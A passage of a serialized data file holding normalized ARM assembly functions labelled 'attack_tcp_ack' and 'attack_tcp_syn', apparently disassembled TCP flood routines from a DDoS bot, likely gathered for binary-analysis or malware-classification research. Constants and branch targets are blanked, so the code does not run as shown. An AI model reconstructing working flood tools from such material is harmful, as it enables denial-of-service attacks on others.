\nSTRB~R3,[SP,0]\nSUB~R3,R3,0\nSTRB~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R1,[SP,0]\nADD~R2,R1,R3\nLDRB~R3,[R2,0]\nCMP~R3,0\nLDRHI~R3,[R2,0]\nSTRHI~R3,[SP,0]\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[SP,0]\nMOV~R3,0\nLDR~R2,[SP,0]\nCMP~R2,R3\nBNE~FOO\nBL~FOO\nSTRB~R0,[SP,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[SP,0]\nB~FOO\nLDR~R1,[SP,0]\nAND~R3,R1,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[SP,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[SP,0]\nMOV~R0,R6\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R4,R0\nLDR~R3,[SP,0]\nSTR~R3,[SP,0]\nMOV~R1,R3,LSL0\nSTR~R1,[SP,0]\nMOV~R2,R1,LSR0\nSTR~R2,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nADD~R3,SP,0\nSTR~R3,[SP]\nADD~R3,SP,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nADD~R1,SP,0\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nLDR~R12,[SP,0]\nLDR~R3,[SP,0]\nCMP~R3,R12\nMOVNE~R3,0\nMOVEQ~R3,0\nCMP~R0,0\nMOVLS~R3,0\nCMP~R3,0\nBEQ~FOO\nLDRB~R1,[SP,0]\nLDRB~R3,[SP,0]\nORR~R1,R1,R3,LSL0\nLDRB~R3,[SP,0]\nLDRB~R2,[SP,0]\nORR~R3,R3,R2,LSL0\nCMP~R1,R3\nBNE~FOO\nLDRB~R2,[SP,0]\nAND~R3,R2,0\nCMP~R3,0\nBNE~FOO\nLDR~R4,[SP,0]\nSTR~R12,[R9,R4,LSL0]\nLDR~R2,[R5,0]\nMOV~R0,R4,LSL0\nADD~R0,R0,R9\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R0,0]\nLDR~R3,[R5,0]\nAND~R2,R3,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R3,LSR0\nAND~R1,R3,0\nMOV~R3,R3,LSL0\nORR~R3,R3,R1,LSL0\nORR~R2,R2,R3\nSTR~R2,[R0,0]\nLDR~R3,[R5]\nMOV~R3,R3,LSR0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nMOV~R4,R4,LSL0\nLDR~R0,[SP,0]\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R0,[R2,R4]\nLDR~R3,[SP,0]\nLDR~R1,[SP,0]\nLDR~R2,[R1,R3,LSL0]\nADD~R5,R2,0\nLDRB~R3,[R2]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R2]\nLDRB~R3,[R2]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R2]\nLDR~R3,[SP,0]\nSTRB~R3,[R2,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R3,R3,0\nLDR~R1,[SP,0]\nORR~R3,R1,R3,LSL0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nLDR~R1,[SP,0]\nAND~R3,R1,0\nLDR~R1,[SP,0]\nORR~R3,R1,R3,LSL0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nLDR~R3,[SP,0]\nSTRB~R3,[R2,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nMOVNE~R3,0\nSTRNEB~R3,[R2,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R2,0]\nMOV~R3,0\nSTRB~R3,[R2,0]\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R2,0]\nLDR~R3,[SP,0]\nLDR~R3,[R9,R3,LSL0]\nSTR~R3,[R2,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R9\nLDRB~R2,[R3,0]\nLDRB~R3,[R3,0]\nORR~R2,R2,R3,LSL0\nSTRB~R2,[R5]\nMOV~R2,R2,ASR0\nSTRB~R2,[R5,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R9\nLDRB~R2,[R3,0]\nLDRB~R3,[R3,0]\nORR~R2,R2,R3,LSL0\nSTRB~R2,[R5,0]\nMOV~R2,R2,ASR0\nSTRB~R2,[R5,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R9\nLDR~R3,[R3,0]\nSTR~R3,[R5,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R9\nLDR~R3,[R3,0]\nSTR~R3,[R5,0]\nLDRB~R3,[R5,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nORR~R3,R3,0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nORR~R3,R3,0\nSTRB~R3,[R5,0]\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDRB~R3,[R5,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nAND~R2,R10,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nAND~R2,R8,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nLDRB~R3,[R5,0]\nAND~R2,R7,0\nBIC~R3,R3,0\nORR~R2,R2,R3\nSTRB~R2,[R5,0]\nADD~R0,R5,0\nMOV~R1,R11\nBL~FOO\nB~FOO\nTST~R2,0\nBEQ~FOO\nMOV~R0,R6\nBL~FOO\nB~FOO\nMOV~R0,0\nBL~FOO\nRSB~R0,R4,R0\nCMP~R0,0\nBLE~FOO\nMOV~R0,R6\nBL~FOO\nB~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nCMP~R3,R2\nBLT~FOO\nMOV~R3,0\nLDR~R1,[SP,0]\nCMP~R1,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R1,R3\nMOV~R7,0\nADD~R8,R11,0\nMOV~R3,R8,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nMOV~R10,R3,LSL0\nLDR~R2,[SP,0]\nLDR~R6,[R2,R1,LSL0]\nMOV~R5,R6\nADD~R4,R6,0\nMOV~R3,0\nLDR~R1,[SP,0]\nCMP~R1,R3\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nADDNE~R0,R4,0\nMOVNE~R1,R11\nBLNE~FOO\nSTRB~R7,[R5,0]\nSTRB~R7,[R5,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nMOV~R2,R2,LSL0\nADD~R2,R9,R2\nLDR~R3,[R2,0]\nMOV~R1,R3,LSL0\nADD~R3,R3,0\nSTR~R3,[R2,0]\nMOV~R3,R1,LSR0\nAND~R3,R3,0\nORR~R3,R3,R1,LSR0\nSTR~R3,[R4,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSL0\nADD~R3,R3,R9\nLDR~R2,[R3,0]\nMOV~R2,R2,LSL0\nMOV~R3,R2,LSR0\nAND~R3,R3,0\nORR~R3,R3,R2,LSR0\nSTR~R3,[R4,0]\nSTRB~R7,[R4,0]\nSTRB~R7,[R4,0]\nMOV~R0,R5\nMOV~R1,R4\nMOV~R2,R10,LSR0\nMOV~R3,R8\nBL~FOO\nSTRB~R0,[R4,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nLDR~R3,[SP,0]\nADD~R2,R2,R3\nLDR~R3,[R4]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R6\nADD~R2,R11,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R1,R3,0\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nCMP~R1,R2\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p209
L2160L
tp210
a(S'attack_tcp_ack'
p211
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R11,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R9,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R6,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nSTR~R1,[SP,0]\nBLE~FOO\nMOV~R4,R3\nLDR~R2,[SP,0]\nADD~R3,R2,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R5,R3,R2,LSL0\nMOV~R3,R5,ASR0\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R1,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R2,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~R4,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nSTRB~R5,[R1,0]\nLDR~R0,[SP,0]\nSTRB~R0,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nLDR~R0,[SP,0]\nCMP~R0,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nSTR~R2,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R0,[SP,0]\nADD~R3,R3,R0\nLDR~R3,[R3,0]\nSTR~R3,[R1,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R4,0]\nLDRB~R3,[R4,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R11,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R9,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R10,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R8,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R7,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nLDRB~R3,[R4,0]\nAND~R2,R6,0\nBIC~R3,R3,0\nORR~R2,R2,R3\nSTRB~R2,[R4,0]\nBL~FOO\nSTRB~R0,[R4,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R4,0]\nCMP~R10,0\nLDRNEB~R3,[R4,0]\nORRNE~R3,R3,0\nSTRNEB~R3,[R4,0]\nADD~R0,R4,0\nLDR~R1,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nLDR~R1,[SP,0]\nCMP~R1,R4\nBGT~FOO\nMOV~R3,0\nLDR~R2,[SP,0]\nCMP~R2,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R8,R3,0\nMOV~R10,0\nLDR~R3,[SP,0]\nADD~R9,R3,0\nMOV~R11,R9,LSL0\nMOV~R0,R11,LSR0\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nLDR~R7,[R1,R2,LSL0]\nMOV~R5,R7\nADD~R6,R7,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R0,[SP,0]\nADD~R2,R3,R0\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nLDR~R1,[SP,0]\nADD~R3,R3,R1\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R7,0]\nLDR~R2,[SP,0]\nCMN~R2,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R3,[SP,0]\nCMP~R3,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R0,[SP,0]\nCMP~R0,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,R8\nBNE~FOO\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R8\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R8\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R0,[SP,0]\nCMP~R0,0\nADDNE~R0,R6,0\nLDRNE~R1,[SP,0]\nBLNE~FOO\nSTRB~R10,[R5,0]\nSTRB~R10,[R5,0]\nMOV~R0,R5\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R10,[R6,0]\nSTRB~R10,[R6,0]\nMOV~R2,R11,LSR0\nAND~R2,R2,0\nMOV~R0,R5\nMOV~R1,R6\nLDR~R3,[SP,0]\nORR~R2,R3,R2,LSL0\nMOV~R3,R9\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nMOV~R2,R3,LSL0\nSUB~R2,R2,R3,LSL0\nLDR~R0,[SP,0]\nADD~R2,R2,R0\nLDR~R3,[R6]\nMOV~R3,R3,LSR0\nSTRB~R3,[R2,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R2,0]\nSTR~R2,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R7\nLDR~R3,[SP,0]\nADD~R2,R3,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nLDR~R0,[SP,0]\nCMP~R0,R2\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p212
L1720L
tp213
a(S'attack_tcp_syn'
p214
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R11,R1\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R7,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R1,[SP,0]\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R7,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nAND~R6,R6,0\nSTR~R6,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R9,[SP,0]\nCMP~R9,0\nBLE~FOO\nMOV~R4,R3\nLDR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R1,[SP,0]\nMOV~R1,R1,LSR0\nSTR~R1,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R0,[R2,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R1,[R2,R3,LSL0]\nADD~R0,R1,0\nADD~R12,R1,0\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDRB~R3,[R1]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R1]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nMOV~R2,0\nSTRB~R2,[R1,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nAND~R3,R2,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R1,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R1,0]\nLDR~R3,[SP,0]\nSTRB~R3,[R1,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nMOVNE~R3,0\nSTRNEB~R3,[R1,0]\nMOV~R2,0\nSTRB~R2,[R1,0]\nLDR~R3,[SP,0]\nSTR~R3,[R1,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R3,R3,R11\nLDR~R3,[R3,0]\nSTR~R3,[R1,0]\nLDR~R1,[SP,0]\nAND~R3,R1,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R2,R1,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R0,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTR~R3,[R0,0]\nLDRB~R3,[R0,0]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nLDR~R1,[SP,0]\nAND~R2,R1,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nAND~R2,R10,0\nBIC~R3,R3,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R0,0]\nLDRB~R3,[R0,0]\nAND~R2,R8,0\nBIC~R3,R3,0\nORR~R2,R2,R3\nSTRB~R2,[R0,0]\nMOV~R6,0\nMOV~R4,R12\nSTRB~R6,[R4]\nMOV~R5,0\nSTRB~R5,[R12,0]\nADD~R7,R4,0\nBL~FOO\nAND~R0,R0,0\nMOV~R3,0\nADD~R0,R0,R3\nMOV~R0,R0,LSL0\nMOV~R3,R0,LSR0\nAND~R3,R3,0\nORR~R3,R3,R0,LSR0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R7,0]\nSTRB~R5,[R4,0]\nSTRB~R6,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nADD~R3,R3,0\nSTRB~R3,[R4,0]\nBL~FOO\nSTR~R0,[R4,0]\nMOV~R2,0\nSTR~R2,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nADD~R3,R3,0\nSTRB~R3,[R4,0]\nSTRB~R3,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nCMP~R9,R4\nBGT~FOO\nMOV~R3,0\nCMP~R9,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R8,R3,0\nMOV~R10,0\nLDR~R1,[SP,0]\nLDR~R7,[R1,R